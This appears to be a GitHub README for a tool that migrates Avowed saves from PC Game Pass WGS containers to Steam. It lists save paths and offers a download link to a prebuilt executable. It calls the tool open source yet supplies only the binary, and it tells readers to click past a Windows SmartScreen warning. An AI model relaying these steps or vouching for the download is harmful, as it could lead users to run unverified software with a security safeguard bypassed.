<p align="center">
  <img src="https://i.postimg.cc/FzSNY7mL/banner.png" alt="Avowed Game Pass to Steam Save Migrator — Convert PC Game Pass (WGS) Saves to Steam" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-GamePass%20%E2%86%94%20Steam-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-avowed--wgs--migrator--v1.1-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Avowed Game Pass to Steam Save Migrator — Convert PC Game Pass (WGS) Saves to Steam

**Played Avowed on PC Game Pass and switched to Steam? Xbox App hides Obsidian's Unreal Engine 5 saves inside hashed ObsidianEntertainment.Avowed WGS containers, while Steam stores them under AppData\Local\Alabama\Saved\SaveGames. Bridge your saves cleanly.**

Avowed Game Pass to Steam Save Migrator automates converting saves between Xbox App and Steam on Windows: **parsing `container.index` inside `%LOCALAPPDATA%\Packages\ObsidianEntertainment.Avowed_*\SystemAppData\wgs\` and extracting properly named `.sav` files into `%LOCALAPPDATA%\Alabama\Saved\SaveGames`**.

This project is aimed at **Avowed on Windows 10/11 PC** for migrating single-player character saves between PC Game Pass and Steam.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Steam Avowed shows empty Load menu after playing on Game Pass | Xbox App stores saves in `ObsidianEntertainment.Avowed_*\SystemAppData\wgs` | Decode `container.index` and extract `.sav` files into `Alabama\Saved\SaveGames` |
| Could not find an `Avowed` folder in `%LOCALAPPDATA%` on Steam | Obsidian uses Avowed's internal project codename `Alabama` in `AppData\Local` | Automatically target `%LOCALAPPDATA%\Alabama\Saved\SaveGames\<SteamID>` |
| Raw hex files from `wgs` are ignored by Steam Avowed | UE5 save slots require exact internal filenames from `container.index` | Restore original `.sav` filenames and timestamps automatically |
| Steam Cloud overwrites migrated saves on launch | Steam Cloud syncs a fresh blank profile on first boot | Run Steam Avowed once first, back up, then copy converted `.sav` files |

## Download for Windows

[**Download AvowedSaveMigrator.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/AvowedSaveMigrator.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `AvowedSaveMigrator.exe`? (Key features)

- Locates `%LOCALAPPDATA%\Packages\ObsidianEntertainment.Avowed_*\SystemAppData\wgs` automatically.
- Decodes `container.index` to restore real `.sav` filenames for all character saves and autosaves.
- Targets Steam's `%LOCALAPPDATA%\Alabama\Saved\SaveGames\<SteamID>` directory automatically.
- Creates dated backups of both folders and leaves your original Game Pass save untouched.

### Sample Output

```text
[AvowedSaveMigrator] Scanning ObsidianEntertainment.Avowed WGS & Steam Alabama paths...
[OK]   Game Pass WGS    : C:\Users\Player\AppData\Local\Packages\ObsidianEntertainment.Avowed\SystemAppData\wgs
[OK]   Decoded Saves    : 7 character save slots extracted from container.index
[OK]   Backup Created   : Documents\Avowed-SaveBackup\2026-11-23\
[OK]   Steam Target     : C:\Users\Player\AppData\Local\Alabama\Saved\SaveGames\76561198041299104
```

The release ZIP is named `AvowedSaveMigrator.zip`; the Windows executable inside is named `AvowedSaveMigrator.exe`.

1. Close Avowed Save Migrator before updating or replacing executable files.
2. Click **Download AvowedSaveMigrator.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `AvowedSaveMigrator.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with PC Game Pass and/or Steam versions of Avowed installed.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `AvowedSaveMigrator.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Steam `Alabama` codename path vs. Xbox `ObsidianEntertainment.Avowed`

Saves you from hunting hidden folders by mapping both storefronts' exact paths automatically.

### Hashed `wgs` container extraction

Restores `.sav` extensions and internal filenames recorded in `container.index`.

### Protecting existing saves with automatic dated backups

Backs up both `wgs` and Steam `SaveGames` before writing files.

### 100% read-only access to Game Pass `wgs`

Keeps your Xbox cloud progress intact.

## Default folders and configuration paths

Avowed separates PC Game Pass and Steam saves across two `%LOCALAPPDATA%` directories:

```text
%LOCALAPPDATA%\Packages\ObsidianEntertainment.Avowed_*\SystemAppData\wgs\
```

Typical directory layout:

```text
Xbox Game Pass (Source):
%LOCALAPPDATA%\Packages\ObsidianEntertainment.Avowed_*\SystemAppData\wgs\<XUID>\
├── container.index
└── <ContainerGUID>\<HexBlob>

Steam Edition (Target):
%LOCALAPPDATA%\Alabama\Saved\SaveGames\<SteamID>\
```

Launch Steam Avowed once to the main menu so Unreal Engine creates `%LOCALAPPDATA%\Alabama\Saved\SaveGames\<SteamID>` before migrating.

## Quick start guide

Follow these steps to get started:

1. **Close Avowed on both Xbox App and Steam.** Wait for cloud synchronization to complete.
2. **Launch Steam Avowed once to the main menu, then exit.** Creates `%LOCALAPPDATA%\Alabama\Saved\SaveGames\<SteamID>`.
3. **Extract `AvowedSaveMigrator.zip` and run `AvowedSaveMigrator.exe`.** Backs up both folders and extracts your `.sav` files to Steam.
4. **Launch Steam Avowed, load your Envoy, and create a fresh manual save.** Syncs your Living Lands progress to Steam Cloud.

### Data safety note

Never delete or rename files inside `SystemAppData\wgs\`; work strictly from extracted copies.

## What the status summary shows

Avowed Save Migrator displays **detected `ObsidianEntertainment.Avowed` path, decoded `.sav` count, backup path, and target Steam `Alabama\Saved\SaveGames` folder**.

## FAQ

**Why is Avowed's Steam save folder named `Alabama`?**

`Alabama` was Obsidian Entertainment's internal project codename for Avowed during development.

**Can I transfer my Avowed save from PC Game Pass to Steam?**

Yes—extracting the `.sav` payloads from `SystemAppData\wgs` into `Alabama\Saved\SaveGames\<SteamID>` works cleanly.

**Does this delete my Xbox Game Pass save?**

No. Your `wgs` folder is read-only and remains untouched.

## Useful reading

- [Avowed on Steam](https://store.steampowered.com/app/2457220/Avowed/)

## More Windows Gaming Utilities

- [Expedition33-GamePassSaveBridge](../Expedition33-GamePassSaveBridge) — Clair Obscur: Expedition 33 Game Pass ↔ Steam save bridge
- [OblivionRemaster-WGSSaveConverter](../OblivionRemaster-WGSSaveConverter) — Oblivion Remastered Game Pass (`wgs`) ↔ Steam save converter
- [DoomDarkAges-GamePassSteamSync](../DoomDarkAges-GamePassSteamSync) — DOOM: The Dark Ages Game Pass ↔ Steam save bridge
- [UE5-EngineIniStutterTuner](../UE5-EngineIniStutterTuner) — One-click Unreal Engine 5 Engine.ini stutter & texture pool tuner

*Independent community project. Not affiliated with Obsidian Entertainment, Xbox Game Studios, Microsoft, Valve, or Steam.*
